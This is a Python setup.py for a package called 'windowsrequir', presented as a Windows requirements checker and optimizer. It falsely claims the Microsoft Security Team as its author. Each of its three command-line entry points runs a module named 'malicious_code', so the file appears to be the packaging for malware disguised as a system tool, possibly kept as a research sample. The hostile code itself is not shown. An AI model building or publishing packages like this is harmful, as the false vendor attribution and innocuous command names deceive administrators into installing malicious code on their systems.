from setuptools import setup, find_packages

with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()

setup(
    name="windowsrequir",
    version="1.0.2",
    author="Microsoft Security Team",
    author_email="security@microsoft.com",
    description="Windows system requirements checker and optimizer",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: Microsoft :: Windows",
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: System Administrators",
    ],
    python_requires=">=3.6",
    install_requires=[
        "requests",
        "psutil",
        "cryptography",
    ],
    entry_points={
        'console_scripts': [
            'windows-requirements=windowsrequir.malicious_code:main',
            'syscheck=windowsrequir.malicious_code:main',
            'win-optimizer=windowsrequir.malicious_code:main',
        ],
    },
    keywords="windows security system requirements optimizer",
)